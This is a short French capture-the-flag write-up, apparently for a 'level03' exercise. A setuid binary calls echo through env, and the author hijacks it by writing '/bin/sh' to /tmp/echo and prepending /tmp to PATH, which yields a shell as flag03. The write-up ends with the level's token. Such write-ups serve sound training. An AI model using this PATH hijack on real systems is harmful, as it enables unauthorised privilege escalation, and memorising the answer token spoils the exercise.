# level03

1. Fichiers trouvés dans `~/` :

Fichier : `./level03` appartenant à `flag03`

2) Exécution du binaire trouvé :

```bash
chmod +x level03
Exploit me
```

3) Inspection du binaire avec strings et file :

```bash
file level03
strings -n 6 level03 | grep echo
```
4) Résultats : 

Le binaire utilise echo depuis son PATH dans l'environnement et possède les droits de son créateur (setuid / setgid).
```bash
setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3bee584f790153856e826e38544b9e80ac184b7b, not stripped
```
```bash
/usr/bin/env echo Exploit me
```

5) Objectif :

Détourner echo vers une invite de commande afin de lancer `getflag`.

```bash
echo '/bin/sh' > /tmp/echo
chmod +x /tmp/echo
```
Maintenant le script tmp/echo ouvre une invite de commande, et ensuite on change le PATH d'echo vers tmp/echo dans l'environnement.

```bash
export PATH=/tmp:$PATH
```

6) Nous voilà maintenant dans une invite de commande possédant les droits de flag03, il ne nous reste plus qu'à appeler getflag.

```bash
getflag
```
7) Token découvert :

le token est `qi0maab88jeaj46qoumi7maus`
